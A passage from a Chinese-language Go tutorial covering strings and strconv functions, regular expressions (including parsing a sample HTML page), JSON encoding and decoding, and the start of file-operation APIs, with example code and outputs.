strings.Repeat(\u0026#34;go\u0026#34;, 3) fmt.Println(\u0026#34;hello,\u0026#34; + newStr) } /* 运行结果： hello,gogogo */ 2.1.5 Replace函数 语法：func Replace(s, old, new string, n int) string，在字符串s中，把old字符串替换为new字符串。n表示替换的次数，小于0表示全部替换。 如果old为空，则在字符串的开头和每个UTF-8序列之后添加n个new。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;A\u0026#34;, -1)) fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, -1)) fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, 1)) fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;9\u0026#34;, 1)) fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;9\u0026#34;, 3)) fmt.Println(strings.Replace(\u0026#34;hellogo\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;9\u0026#34;, -1)) //old为空，n为-1，头部添加new，然后每个UTF-8字符后面再添加new } /* 运行结果： hellAgA hellg hellgo 9hellogo 9h9e9llogo 9h9e9l9l9o9g9o9 */ 2.1.6 Split函数 语法：func Split(s, sep string) []string，把s字符串按照sep分割，返回slice。 大意：将s分割为所有由sep分隔的子字符串，并返回这些分隔符之间的子字符串的一部分。 如果s不包含sep且sep不为空，则Split返回长度为1的切片，其唯一元素为s。 如果sep为空，则Split在每个UTF-8序列之后拆分。 如果s和sep均为空，则Split返回一个空切片。 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 import ( \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { s := \u0026#34;hello@go@barry\u0026#34; sli := strings.Split(s, \u0026#34;@\u0026#34;) fmt.Println(sli) s = \u0026#34; 11-22 - 33 \u0026#34; sli = strings.Split(s, \u0026#34; \u0026#34;) //以空格分割，sep之间有子字符串会被显示出来 fmt.Println(sli) s = \u0026#34;a man a plan a\u0026#34; sli = strings.Split(s, \u0026#34;a\u0026#34;) //\u0026#34;a\u0026#34;之间的空格都会被显示出来 fmt.Println(sli) s = \u0026#34;Anagod\u0026#34; sli = strings.Split(s, \u0026#34;c\u0026#34;) fmt.Println(sli) s = \u0026#34;我爱Golangひじょう\u0026#34; sli = strings.Split(s, \u0026#34;\u0026#34;) //根据UTF-8分割 fmt.Println(sli) s = \u0026#34;\u0026#34; sli = strings.Split(s, \u0026#34;\u0026#34;) fmt.Println(sli) } /* 运行结果： [hello go barry] [ 11-22 - 33 ] [ m n pl n ] [Anagod] [我 爱 G o l a n g ひ じ ょ う] [] */ */ 2.1.7 Trim函数 语法：func Trim(s string, cutset string) string，去除s字符串头尾的cutset。 示例：\n1 2 3 4 5 6 7 8 9 10 func main() { s := \u0026#34;@@@are u ok?@@@\u0026#34; sli := strings.Trim(s, \u0026#34;@\u0026#34;) fmt.Printf(\u0026#34;sli=%+v\\n\u0026#34;, sli) } /* 运行结果： sli=are u ok? */ 2.1.8 Fields函数 语法：func Fields(s string) []string，去除字符串s中的空格，返回slice。 Fields和Split很像，Split功能更加强大，它可以指定字符串。Fields不能指定，只能以空格分割。 示例：\n1 2 3 4 5 6 7 8 9 10 func main() { s := \u0026#34; are @ u # ok? \u0026#34; sli := strings.Fields(s) fmt.Println(sli) } /* 运行结果： [are @ u # ok?] */ 2.2 字符串转换 以下函数都是在strconv包中，使用前必须先导入strconv包！\n2.2.1 Append系列 strconv.AppendXxxx()，将其他类型转换为字符串后，添加到现有的字节切片中。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func main() { //声明一个字节切片，声明切片需要制定len，cap可以省略 byteSlice := make([]byte, 0) //strconv.AppendXxxx()系列都是返回[]byte，需要重新把追加后的新值，赋值给旧的变量，以覆盖旧的变量 byteSlice = strconv.AppendBool(byteSlice, true) //第二个写int的值，第三个制定以什么进制去转换这个int byteSlice = strconv.AppendInt(byteSlice, 123456, 10) byteSlice = strconv.AppendInt(byteSlice, 123456, 16) byteSlice = strconv.AppendInt(byteSlice, 123456, 2) byteSlice = strconv.AppendQuote(byteSlice, \u0026#34;abchellogo\u0026#34;) fmt.Println(\u0026#34;byteSlice=\u0026#34;, string(byteSlice)) } /* 运行结果： byteSlice= true1234561e24011110001001000000\u0026#34;abchellogo\u0026#34; */ 2.2.2 Format 将其他类型转换为字符串。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 func main() { var str string //\u0026#39;f\u0026#39;表示打印的格式。10表示小数精确到几位，-1表示使用最少数量的小数。64表示float64 str += strconv.FormatFloat(3.1415, \u0026#39;f\u0026#39;, 10, 64) //常用的是\u0026#39;f\u0026#39;格式 str += \u0026#34;;\u0026#34; //整型转换为字符串 str += strconv.Itoa(999) fmt.Println(\u0026#34;str=\u0026#34;, str) } /* 运行结果： str= 3.1415000000;999 */ strconv.FormatFloat()的用法：\n1 func FormatFloat(f float64, fmt byte, prec, bitSize int) string 函数将浮点数表示为字符串并返回。\nbitSize表示f的来源类型（32：float32、64：float64），会据此进行舍入。\nfmt表示格式：\u0026lsquo;f\u0026rsquo;（-ddd.dddd）、\u0026lsquo;b\u0026rsquo;（-ddddp±ddd，指数为二进制）、\u0026rsquo;e\u0026rsquo;（-d.dddde±dd，十进制指数）、\u0026lsquo;E\u0026rsquo;（-d.ddddE±dd，十进制指数）、\u0026lsquo;g\u0026rsquo;（指数很大时用\u0026rsquo;e\u0026rsquo;格式，否则\u0026rsquo;f\u0026rsquo;格式）、\u0026lsquo;G\u0026rsquo;（指数很大时用\u0026rsquo;E\u0026rsquo;格式，否则\u0026rsquo;f\u0026rsquo;格式）。\nprec控制精度（排除指数部分）：对\u0026rsquo;f\u0026rsquo;、\u0026rsquo;e\u0026rsquo;、\u0026lsquo;E\u0026rsquo;，它表示小数点后的数字个数；对\u0026rsquo;g\u0026rsquo;、\u0026lsquo;G\u0026rsquo;，它控制总的数字个数。如果prec 为-1，则代表使用最少数量的、但又必需的数字来表示f。\n2.2.3 Parse 把字符串转换为其他类型。 常用示例1：字符串转换为bool\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 func main() { boolValue, err := strconv.ParseBool(\u0026#34;true\u0026#34;) //err=nil的时候，说明没有error if err == nil { fmt.Printf(\u0026#34;boolValue=%+v, type is :%T\\n\u0026#34;, boolValue, boolValue) } else { fmt.Println(\u0026#34;err:\u0026#34;, err) } //bool只有true和false，转换时除了首字母可以大写，其他任何一个字符写错都会返回error boolValue, err = strconv.ParseBool(\u0026#34;FalsE\u0026#34;) if err == nil { fmt.Printf(\u0026#34;boolValue=%+v, type is:%T\\n\u0026#34;, boolValue, boolValue) } else { fmt.Println(\u0026#34;err:\u0026#34;, err) } } /* 运行结果： boolValue=true, type is:bool err: strconv.ParseBool: parsing \u0026#34;FalsE\u0026#34;: invalid syntax */ 常用示例2：字符串转换为int\n1 2 3 4 5 6 7 8 9 func main() { intValue, _ := strconv.Atoi(\u0026#34;7890\u0026#34;) fmt.Printf(\u0026#34;intValue=%d, type is:%T\\n\u0026#34;, intValue, intValue) } /* 运行结果： intValue=7890, type is:int */ 三、正则表达式 正则表达式是一种进行模式匹配和文本操纵（按指定的模式提取）的工具。Golang有内建的regexp标准包支持。 Golang实现的是RE2标准，除了\\C，详细的语法参考：link 备注：反引号在``Golang中表示原始字符串。 提醒：能用strings包解决的，不要用正则。正则很复杂、很难写，效率也没有strings来得高。 详细使用方式请查看：link\n3.1 正则表达式基本使用 1.引入regexp包 2.定义一个解析（匹配）规则 3.使用这个规则进行提取\n3.1.1 .匹配除换行符\\n之外的任意字符 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 import ( \u0026#34;fmt\u0026#34; \u0026#34;regexp\u0026#34; //第1步：引入包 ) func main() { s := \u0026#34;abc a9z . azc, apc;arc \u0026#34; //第2步：定义解析器 reg1 := regexp.MustCompile(`a.c`) //反引号\u0026#34;``\u0026#34;在Golang中表示原始字符串 if reg1 == nil { //解析成功返回正则解析器，失败返回nil fmt.Println(\u0026#34;faild regexp.\u0026#34;) return //解析失败就结束函数，不然跳出if语句后，还会继续往下走 } result := reg1.FindAllStringSubmatch(s, -1) //-1表示匹配所有 fmt.Println(\u0026#34;result=\u0026#34;, result) } /* 运行结果： result= [[abc] [azc] [apc] [arc]] */ 3.1.2 []的使用 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import ( \u0026#34;fmt\u0026#34; \u0026#34;regexp\u0026#34; //第1步：引入包 ) func main() { s := \u0026#34;abc a9z . azc, a666c apc;arc \u0026#34; //第2步：定义解析器 reg1 := regexp.MustCompile(`a\\d[a-z]`) //reg1 := regexp.MustCompile(`a[0-9][a-z]`) //等价于上一条语句 if reg1 == nil { //解析成功返回正则解析器，失败返回nil fmt.Println(\u0026#34;faild regexp.\u0026#34;) return //解析失败就结束函数，不然跳出if语句后，还会继续往下走 } //分段方式返回结果 result := reg1.FindAllStringSubmatch(s, -1) //-1表示匹配所有 fmt.Println(\u0026#34;result=\u0026#34;, result) } /* 运行结果： result= [[a9z]] */ 3.1.3 +匹配前一个字符1次或多次 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import ( \u0026#34;fmt\u0026#34; \u0026#34;regexp\u0026#34; ) func main() { s := \u0026#34;3333.1414 567 agdsd 1.23 7. 08.99 1sdfasdf 6.66 ; 7.a1\u0026#34; reg := regexp.MustCompile(`\\d+\\.\\d+`) if reg == nil { fmt.Println(\u0026#34;regexp failed.\u0026#34;) return //解析失败就结束函数，不然跳出if语句后，还会继续往下走 } result := reg.FindAllString(s, -1) fmt.Println(\u0026#34;result=\u0026#34;, result) } /* 运行结果： result= [3333.1414 1.23 08.99 6.66] */ \u0026ldquo;08.99\u0026quot;是一个字符串，符合\\d的规则，所以是完整显示出来了，并不是人类自己理解的0是无用数。\n3.2 解析HTML代码的小示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 import ( \u0026#34;fmt\u0026#34; \u0026#34;regexp\u0026#34; ) func main() { //反引号``，表示原生的字符串 s := ` \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Go语言标准库文档中文版 | Go语言中文网 | Golang中文社区 | Golang中国\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;X-UA-Compatible\u0026#34; content=\u0026#34;IE=edge, chrome=1\u0026#34;\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;/static/img/go.ico\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;apple-touch-icon\u0026#34; type=\u0026#34;image/png\u0026#34; href=\u0026#34;/static/img/logo2.png\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;author\u0026#34; content=\u0026#34;polaris \u0026lt;polaris@studygolang.com\u0026gt;\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;keywords\u0026#34; content=\u0026#34;中文, 文档, 标准库, Go语言,Golang,Go社区,Go中文社区,Golang中文社区,Go语言社区,Go语言学习,学习Go语言,Go语言学习园地,Golang 中国,Golang中国,Golang China, Go语言论坛, Go语言中文网\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;Go语言文档中文版，Go语言中文网，中国 Golang 社区，Go语言学习园地，致力于构建完善的 Golang 中文社区，Go语言爱好者的学习家园。分享 Go 语言知识，交流使用经验\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;div\u0026gt;呵呵\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;哈哈哈\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;f**kf**kf**k\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;呵呵111111111\u0026lt;/div\u0026gt; \u0026lt;frameset cols=\u0026#34;15,85\u0026#34;\u0026gt; \u0026lt;frame src=\u0026#34;/static/pkgdoc/i.html\u0026#34;\u0026gt; \u0026lt;frame name=\u0026#34;main\u0026#34; src=\u0026#34;/static/pkgdoc/main.html\u0026#34; tppabs=\u0026#34;main.html\u0026#34; \u0026gt; \u0026lt;noframes\u0026gt; \u0026lt;/noframes\u0026gt; \u0026lt;/frameset\u0026gt; \u0026lt;/html\u0026gt; ` //(.*)表示分组，我只要小括号中间这一部分的内容 //(?s:)表示组命令，s表示匹配换行符`\\n` reg := regexp.MustCompile(`\u0026lt;div\u0026gt;(?s:(.*?))\u0026lt;/div\u0026gt;`) if reg == nil { fmt.Println(\u0026#34;regexp failed.\u0026#34;) return } result := reg.FindAllStringSubmatch(s, -1) //会把 \u0026#34;\u0026lt;div\u0026gt;呵呵\u0026lt;/div\u0026gt;\u0026#34; 和 \u0026#34;呵呵\u0026#34;，都取出来 fmt.Println(\u0026#34;result=\u0026#34;, result) fmt.Println(\u0026#34;--------------------------------------------\u0026#34;) //查看一下切片中每个元素的构成情况 for _, text := range result { fmt.Printf(\u0026#34;text[0]=%v, text[1]=%v\\n\u0026#34;, text[0], text[1]) } fmt.Println(\u0026#34;--------------------------------------------\u0026#34;) //首尾的\u0026lt;div\u0026gt;标签不要，我只想要\u0026lt;div\u0026gt;呵呵\u0026lt;/div\u0026gt;中间的内容 呵呵 cleanResult := []string{} for _, text := range result { cleanResult = append(cleanResult, text[1]) } fmt.Println(\u0026#34;cleanResult=\u0026#34;, cleanResult) } /* 运行结果： result= [[\u0026lt;div\u0026gt;呵呵\u0026lt;/div\u0026gt; 呵呵] [\u0026lt;div\u0026gt;哈哈哈\u0026lt;/div\u0026gt; 哈哈哈] [\u0026lt;div\u0026gt;f**kf**kf**k\u0026lt;/div\u0026gt; f**kf**kf**k] [\u0026lt;div\u0026gt;呵呵111111111\u0026lt;/div\u0026gt; 呵呵111111111]] -------------------------------------------- text[0]=\u0026lt;div\u0026gt;呵呵\u0026lt;/div\u0026gt;, text[1]=呵呵 text[0]=\u0026lt;div\u0026gt;哈哈哈\u0026lt;/div\u0026gt;, text[1]=哈哈哈 text[0]=\u0026lt;div\u0026gt;f**kf**kf**k\u0026lt;/div\u0026gt;, text[1]=f**kf**kf**k text[0]=\u0026lt;div\u0026gt;呵呵111111111\u0026lt;/div\u0026gt;, text[1]=呵呵111111111 -------------------------------------------- cleanResult= [呵呵 哈哈哈 f**kf**kf**k 呵呵111111111] */ 四、json json（JavaScript Object Notation）比 XML 更轻量级的数据交换格式，被广泛应用于 Web 服务端程序和客户端之间的数据通信。 其表现形式为键-值对集合的文本描述形式，跨平台、跨语言的数据交换格式。 Golang有内建的 encoding/json 包，来处理 json。 json 官方网站：link（这是官方汉化版，英文原版把URL中的zh换成en） 在线格式化：link\n4.1 编码json 编码 json 就是生成一个 json，将一些信息做成一个 json 文本格式。\n4.1.1 使用结构体生成一个json 想要生成一个 json，结构体成员的变量名首字母必须大写，否则无法生成！ 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 import ( \u0026#34;encoding/json\u0026#34; //引入标准包 \u0026#34;fmt\u0026#34; ) type Company struct { CompanyName string Deps []string IsOK bool Price float64 unit string //成员变量名首字母小写，就不会生成到json中去 } func main() { //初始化结构体中的切片成员时，需要制定类型，不然报错：Missing type in composite literal ===\u0026gt; 复合文字中缺少类型 c1 := Company{\u0026#34;山景城Google公司\u0026#34;, []string{\u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;Google Mail\u0026#34;}, true, 953.37, \u0026#34;Dollars\u0026#34;} //编码，格式化编码，根据内容生成json文本 c1Byte, err := json.MarshalIndent(c1, \u0026#34;\u0026#34;, \u0026#34;\\t\u0026#34;) if err != nil { fmt.Println(\u0026#34;json marshal failed.\u0026#34;) return } fmt.Println(c1Byte) fmt.Println(string(c1Byte)) //Marshal()返回切片字节，字节默认以ASCII码值打印，需要使用string()转换 fmt.Printf(\u0026#34;type is : %T\\n\u0026#34;, c1Byte) //是个uint8的切片类型，byte的底层是用uint8实现 } /* 运行结果： [123 10 9 34 67 111 109 112 97 110 121 78 97 109 101 34 58 32 34 229 177 177 230 153 175 229 159 142 71 111 111 103 108 101 229 133 172 229 143 184 34 44 10 9 34 68 101 112 115 34 58 32 91 10 9 9 34 83 101 97 114 99 104 32 69 110 103 105 110 101 34 44 10 9 9 34 65 110 100 114 105 111 100 34 44 10 9 9 34 71 111 111 103 108 101 32 77 97 105 108 34 10 9 93 44 10 9 34 73 115 79 75 34 58 32 116 114 117 101 44 10 9 34 80 114 105 99 101 34 58 32 57 53 51 46 51 55 10 125] { \u0026#34;CompanyName\u0026#34;: \u0026#34;山景城Google公司\u0026#34;, \u0026#34;Deps\u0026#34;: [ \u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;Google Mail\u0026#34; ], \u0026#34;IsOK\u0026#34;: true, \u0026#34;Price\u0026#34;: 953.37 } type is : []uint8 */ 结构体成员的变量名首字母必须大写，否则无法生成： 有没有生成成功可以把生成后的内容复制去json.cn网站上，能够出现正确的内容，则就生成成功了。\n4.1.2 结构体编码json时的二次编码语法 在结构体数据类型后面加上：json:\u0026quot;Syntax\u0026quot;。Syntax 为语法格式。 json:\u0026quot;newName\u0026quot;，给这个字段起个别名，最终以这个 newName 的命名为准。 json:\u0026quot;-\u0026quot;，表示不让这个字段输出，相当于不添加到 json 中去。 json:\u0026quot;,string\u0026quot;，表示以字符串格式输出。 注意：使用结构体生成 json，结构体中的成员变量名的首字母必须大写！ 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) type Company struct { CompanyName string `json:\u0026#34;companyName\u0026#34;` //二次编码，最终会以这个二次编码的字段名companyName为准 Deps []string `json:\u0026#34;departments\u0026#34;` //就相当于起个别名 IsOK bool `json:\u0026#34;-\u0026#34;` //-表示这个字段不会输出 Price float64 `json:\u0026#34;price,string\u0026#34;` //指定以字符串格式输出 Unit string `json:\u0026#34;moneyUnit\u0026#34;` //如果成员变量名首字母还是小写，依然还是不会生成到json中去 } func main() { //初始化结构体中的切片成员时，需要制定类型，不然报错：Missing type in composite literal ===\u0026gt; 复合文字中缺少类型 c1 := Company{\u0026#34;山景城Google公司\u0026#34;, []string{\u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34;}, true, 953.37, \u0026#34;Dollars\u0026#34;} //编码，格式化编码，根据内容生成json文本 c1Byte, err := json.MarshalIndent(c1, \u0026#34;\u0026#34;, \u0026#34;\\t\u0026#34;) if err != nil { fmt.Println(\u0026#34;json marshal failed.\u0026#34;) return } fmt.Println(string(c1Byte)) //Marshal()返回切片字节，字节默认以ASCII码值打印，需要使用string()转换 fmt.Printf(\u0026#34;type is : %T\\n\u0026#34;, c1Byte) //是个uint8的切片类型，byte的底层是用uint8实现 } /* 运行结果： { \u0026#34;companyName\u0026#34;: \u0026#34;山景城Google公司\u0026#34;, \u0026#34;departments\u0026#34;: [ \u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34; ], \u0026#34;price\u0026#34;: \u0026#34;953.37\u0026#34;, \u0026#34;moneyUnit\u0026#34;: \u0026#34;Dollars\u0026#34; } type is : []uint8 */ 4.1.3 使用map编码json 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { //json中的值可能会有各种类型，解决这一问题：声明一个能够接收任意类型的万能空接口 m := make(map[string]interface{}) m[\u0026#34;companyName\u0026#34;] = \u0026#34;山景城Google公司\u0026#34; m[\u0026#34;departments\u0026#34;] = []string{\u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34;} //切片需要指明类型 m[\u0026#34;IsOK\u0026#34;] = true m[\u0026#34;price\u0026#34;] = 953.37 m[\u0026#34;moneyUnit\u0026#34;] = \u0026#34;Dollars\u0026#34; //编码成json mByte, err := json.MarshalIndent(m, \u0026#34;\u0026#34;, \u0026#34;\\t\u0026#34;) //按一定的格式输出json if err != nil { fmt.Println(\u0026#34;json marshal failed.\u0026#34;) return } fmt.Println(string(mByte)) } /* 运行结果： { \u0026#34;IsOK\u0026#34;: true, \u0026#34;companyName\u0026#34;: \u0026#34;山景城Google公司\u0026#34;, \u0026#34;departments\u0026#34;: [ \u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34; ], \u0026#34;moneyUnit\u0026#34;: \u0026#34;Dollars\u0026#34;, \u0026#34;price\u0026#34;: 953.37 } */ 4.2 解码json 解析一个 json 就是编码的反过程：已经有了一个现成的 json，从中提取出信息，并保存到结构体或者 map。\n4.2.1 解码json到结构体 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) type Company struct { CompanyName string `json:\u0026#34;companyName\u0026#34;` //二次编码，起个别名。是为了跟原生json中的键名保持一致 Deps []string `json:\u0026#34;departments\u0026#34;` //二次编码，起个别名。是为了跟原生json中的键名保持一致 IsOK bool Price float64 `json:\u0026#34;price\u0026#34;` //二次编码，起个别名。是为了跟原生json中的键名保持一致 Unit string `json:\u0026#34;moneyUnit\u0026#34;` //二次编码，起个别名。是为了跟原生json中的键名保持一致 } func main() { jsonBuf := ` { \u0026#34;IsOK\u0026#34;: true, \u0026#34;companyName\u0026#34;: \u0026#34;山景城Google公司\u0026#34;, \u0026#34;departments\u0026#34;: [ \u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34; ], \u0026#34;moneyUnit\u0026#34;: \u0026#34;Dollars\u0026#34;, \u0026#34;price\u0026#34;: 953.37 } ` //1.字段全部解析 var c1 Company //jsonBuf解析到c1中去。要修改结构体中的值，需要引用传递。第二个参数必须要地址传递 err := json.Unmarshal([]byte(jsonBuf), \u0026amp;c1) if err != nil { fmt.Println(\u0026#34;Unmarshal failed, error:\u0026#34;, err) return } fmt.Printf(\u0026#34;c1 = %+v, type is : %T\\n\u0026#34;, c1, c1) //2.只解析某几个字段 //重新声明一个结构体，写上想要的那几个字段。最终只会解码指定的这几个字段。注意：数据类型和名称依然要完全统一 type SimpleCompany struct { CompanyName string `json:\u0026#34;companyName\u0026#34;` Deps []string `json:\u0026#34;departments\u0026#34;` } var c2 SimpleCompany //声明这个新定义的结构体的变量 //jsonBuf解析到c2中去。要修改结构体中的值，需要引用传递。第二个参数必须要地址传递 err = json.Unmarshal([]byte(jsonBuf), \u0026amp;c2) if err != nil { fmt.Println(\u0026#34;Unmarshal failed, error:\u0026#34;, err) return } fmt.Printf(\u0026#34;c2 = %+v, type is : %T\\n\u0026#34;, c2, c2) } /* 运行结果： c1 = {CompanyName:山景城Google公司 Deps:[Search Engine Andriod GMail] IsOK:true Price:953.37 Unit:Dollars}, type is : main.Company c2 = {CompanyName:山景城Google公司 Deps:[Search Engine Andriod GMail]}, type is : main.SimpleCompany */ 注意事项： 1.原本 json 中的字段名称是什么，结构体中也必须完全一样跟着写。但结构体中的变量名首字母必须大写，所以要用到二次编码格式。二次编码，起个别名，是为了让结构体中的字段名称与原生json中的键名保持一致。 2.Unmarshal() 函数是把第一个 json 文本的 byte 数据写入到第二个结构体变量中去。想要修改结构体中的值，就需要取结构体的地址。需要地址传递！\n4.2.2 解码json到map 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 import ( \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; ) func main() { jsonBuf := ` { \u0026#34;IsOK\u0026#34;: true, \u0026#34;companyName\u0026#34;: \u0026#34;山景城Google公司\u0026#34;, \u0026#34;departments\u0026#34;: [ \u0026#34;Search Engine\u0026#34;, \u0026#34;Andriod\u0026#34;, \u0026#34;GMail\u0026#34; ], \u0026#34;moneyUnit\u0026#34;: \u0026#34;Dollars\u0026#34;, \u0026#34;price\u0026#34;: 953.37 } ` //创建一个map m := make(map[string]interface{}) err := json.Unmarshal([]byte(jsonBuf), \u0026amp;m) //第二个参数必须传内存地址 if err != nil { fmt.Println(\u0026#34;json unmarshal failed. err:\u0026#34;, err) return } fmt.Printf(\u0026#34;%+v\\n\u0026#34;, m) fmt.Println(\u0026#34;---------------------------------------------------------------\u0026#34;) //想要从map中取值，就需要类型断言，一步步反推才能使用 //想要值到每一个内容，就必须通过for迭代，一个个类型断言反推，才能拿到值 var companyName string var isOK bool var price float64 var moneyUnit string var departments string for key, value := range m { switch data := value.(type) { //value.(type)用来匹配下列case的各个数据类型；data是返回过来的值 case string: //要取到对应键中的内容，则需要进一步处理 switch { case key == \u0026#34;companyName\u0026#34;: companyName = data case key == \u0026#34;moneyUnit\u0026#34;: moneyUnit = data } fmt.Printf(\u0026#34;data type is string. key[%s]=%s\\n\u0026#34;, key, data) case bool: if key == \u0026#34;IsOK\u0026#34; { isOK = data } fmt.Printf(\u0026#34;data type is bool, key[%s]=%v\\n\u0026#34;, key, value) case float64: //浮点型用float64才能匹配到 if key == \u0026#34;price\u0026#34; { price = data } fmt.Printf(\u0026#34;data type is float64, key[%s]=%f\\n\u0026#34;, key, value) case []interface{}: //如果value本身是一个切片，需要用空接口（万能类型）来匹配 fmt.Printf(\u0026#34;data type is []interface{}, key[%s]=%+v\\n\u0026#34;, key, value) //如果要在切片中取值，则需要进一步地迭代，一个个取出来，一个个处理 for _, v := range data { //取出切片中，每个元素的下标和值 if s, ok := v.(string); ok { //判断这个值是否为string类型，是返回true，否返回false departments += s + \u0026#34;;\u0026#34; } } } } fmt.Printf(\u0026#34;companyName=%s; departments=%s; isOK=%v; price=%f; moneyUnit=%s\\n\u0026#34;, companyName, departments, isOK, price, moneyUnit) } /* 运行结果： map[IsOK:true companyName:山景城Google公司 departments:[Search Engine Andriod GMail] moneyUnit:Dollars price:953.37] --------------------------------------------------------------- data type is bool, key[IsOK]=true data type is string. key[companyName]=山景城Google公司 data type is []interface{}, key[departments]=[Search Engine Andriod GMail] data type is string. key[moneyUnit]=Dollars data type is float64, key[price]=953.370000 companyName=山景城Google公司; departments=Search Engine;Andriod;GMail;; isOK=true; price=953.370000; moneyUnit=Dollars */ 4.2.3 对两种解析方式的简单总结 解析到 map，只是定义 map 那一段写起来很方便，想要取出里面的值，则需要迭代每一个元素，然后对每一个元素进行类型断言，反推每个数据类型。每个数据类型再单独进行处理。 解析到结构体，只是定义结构体的时候比较麻烦，需要指定每个字段的数据类型，二次编码的名称要跟原生的 json 文本中的键名一样。但是，一次定义就可以把所有的内容都解析进去，后续只需要结构体名称.字段名（structVarName.fieldName）操作即可。\n五、文件操作 Golang 有内建的 os 文件操作包。\n5.1 文件分类 5.1.1 设备文件 平时最常用的有：\n屏幕（标准输出设备） 最常用的一个函数：fmt.Println()，往标准输出设备写内容。 键盘（标准输入设备） fmt.Scan()，从标准输入设备读取内容。 5.1.2 磁盘文件 放在存储设备上的文件。 还可以分为两类：\n文本文件：能够用记事本（Notpad++）打开，且不是乱码的就是文本文件。 二进制文件：用记事本打开后，看到乱码的就是二进制文件。 5.2 文件操作的相关api 5.2.1 新建文件 如果文件不存在则新建，如果文件已存在则会清空原文件。 第1种方式：func Create(name string) (file *File, err Error)，根据提供的文件名（或路径+文件名）创建新的文件，返回一个可读可写的文件指针，默认权限是 0666。内部调用的是 OpenFile()。 第2种方式：func New(fd uintptr, name string) *File，根据文件描述符创建相应的文件，返回一个文件指针。\n5.2.2 打开文件 第1种方式：func Open(name string) (file *File, err Error)，以只读方式打开一个名称为 name 的文件。内部实现调用了OpenFile()。 第2种方式：func OpenFile(name string, flag int, perm uint32) (file *File, err Error)，打开名称为name的文件，flag是打开的方式（如：只读、只写等），perm是权限。\n5.2.3 写文件 第1种方式：func (file *File) Write(b []byte) (n int, err Error)，写入byte到文件。可处理二进制和非二进制文件。 